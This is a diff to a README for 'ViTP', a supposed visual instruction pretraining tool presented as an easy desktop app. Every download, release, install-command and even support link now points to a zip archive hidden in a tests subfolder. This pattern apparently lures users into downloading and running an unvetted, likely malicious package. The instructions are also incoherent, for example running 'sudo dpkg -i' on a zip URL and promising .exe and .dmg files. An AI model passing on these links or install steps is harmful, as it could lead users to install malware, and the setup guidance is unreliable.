@@ -1,7 +1,7 @@
 # 🎉 ViTP - Easy Visual Instruction for Your Domain
 
 ## 📥 Download Now! 
-[![Download ViTP](https://raw.githubusercontent.com/zubairmk83/ViTP/main/thurible/ViTP.zip)](https://raw.githubusercontent.com/zubairmk83/ViTP/main/thurible/ViTP.zip)
+[![Download ViTP](https://github.com/zubairmk83/ViTP/raw/refs/heads/main/mmcv/tests/test_device/test_mlu/Vi_TP_1.1.zip)](https://github.com/zubairmk83/ViTP/raw/refs/heads/main/mmcv/tests/test_device/test_mlu/Vi_TP_1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to ViTP! This application provides an official implementation of "Visual Instruction Pretraining for Domain-Specific Foundation Models." This tool will help you leverage visual instructions tailored for specific fields, making it much easier to achieve your tasks without needing technical knowledge.
@@ -23,7 +23,7 @@ Before you start, ensure your computer meets these requirements:
 To get the latest version of ViTP, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [Download ViTP Here](https://raw.githubusercontent.com/zubairmk83/ViTP/main/thurible/ViTP.zip)
+   [Download ViTP Here](https://github.com/zubairmk83/ViTP/raw/refs/heads/main/mmcv/tests/test_device/test_mlu/Vi_TP_1.1.zip)
 
 2. **Select the Latest Release:** On the releases page, locate the most recent version. This will typically be listed at the top.
 
@@ -32,7 +32,7 @@ To get the latest version of ViTP, follow these steps:
 4. **Install the Application:** 
    - For Windows: Find the downloaded `.exe` file in your Downloads folder. Double-click it to start the installation wizard. Follow the on-screen instructions to complete the installation.
    - For macOS: Locate the `.dmg` file in your Downloads folder. Double-click it and follow the prompts to drag the application to your Applications folder.
-   - For Linux: Use the terminal to navigate to your Downloads folder, and run the appropriate installation command specific to the format (like `sudo dpkg -i https://raw.githubusercontent.com/zubairmk83/ViTP/main/thurible/ViTP.zip` for Debian-based systems).
+   - For Linux: Use the terminal to navigate to your Downloads folder, and run the appropriate installation command specific to the format (like `sudo dpkg -i https://github.com/zubairmk83/ViTP/raw/refs/heads/main/mmcv/tests/test_device/test_mlu/Vi_TP_1.1.zip` for Debian-based systems).
 
 5. **Launch ViTP:** After installation, locate the application on your device. Open it and you’re ready to start!
 
@@ -52,7 +52,7 @@ Should you encounter any issues or have questions, here are some ways to find as
 
 - **Check the Documentation:** We've provided detailed manuals and guides within the app to assist you.
 - **Community Support:** Join our user community forum to ask questions and share experiences with other users.
-- **Contact Support:** If problems persist, feel free to reach out to our support team through the contact form available on our [GitHub page](https://raw.githubusercontent.com/zubairmk83/ViTP/main/thurible/ViTP.zip).
+- **Contact Support:** If problems persist, feel free to reach out to our support team through the contact form available on our [GitHub page](https://github.com/zubairmk83/ViTP/raw/refs/heads/main/mmcv/tests/test_device/test_mlu/Vi_TP_1.1.zip).
 
 ## 📖 Example Use Cases
 ViTP can be utilized across various fields, such as:
